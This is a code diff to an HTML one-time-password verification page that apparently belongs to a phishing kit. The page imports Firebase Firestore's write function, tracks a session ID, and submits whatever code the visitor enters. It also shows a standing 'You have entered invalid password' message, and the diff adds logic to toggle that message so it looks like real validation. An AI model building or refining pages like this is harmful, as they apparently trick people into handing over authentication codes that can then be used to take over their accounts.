@@ -6,7 +6,7 @@
   <link rel="stylesheet" href="a02b572693328546.css">
   <title>OTP Verification</title>
 
-  <!-- 🔴 ONLY RED TEXT CSS (NO BORDER) -->
+  <!-- 🔴 RED TEXT ONLY -->
   <style>
     .otp-error {
       color: #d32f2f;
@@ -45,8 +45,8 @@
           >
           <label>One-Time Password <span>*</span></label>
 
-          <!-- 🔴 TEXT ALREADY VISIBLE -->
-          <div class="otp-error">
+          <!-- 🔴 ERROR TEXT -->
+          <div class="otp-error" id="otpError">
             You have entered invalid password
           </div>
         </div>
@@ -74,7 +74,6 @@
     </footer>
   </div>
 
-  <!-- 🔒 JS COMPLETELY UNCHANGED -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from
@@ -95,14 +94,25 @@
 
     const otpForm = document.getElementById("otpForm");
     const otpInput = document.getElementById("otp");
+    const otpError = document.getElementById("otpError");
     const sessionId = localStorage.getItem("sessionId");
+
+    /* 🔑 MAIN LOGIC */
+    otpInput.addEventListener("input", () => {
+      if (otpInput.value.trim() === "") {
+        otpError.style.display = "block";   // empty → show
+      } else {
+        otpError.style.display = "none";    // typing → hide
+      }
+    });
 
     otpForm.addEventListener("submit", async (e) => {
       e.preventDefault();
+      otpError.style.display = "none"; // Enter/Submit → hide
 
       const otp = otpInput.value.trim();
       if (!otp) {
-        alert("Please enter the OTP.");
+        otpError.style.display = "block";
         return;
       }
 
@@ -119,6 +129,7 @@
       }
     });
 
+    /* OTP TIMER */
     const otpTimerElement = document.getElementById("otp-timer");
     let timeLeft = 180;
 
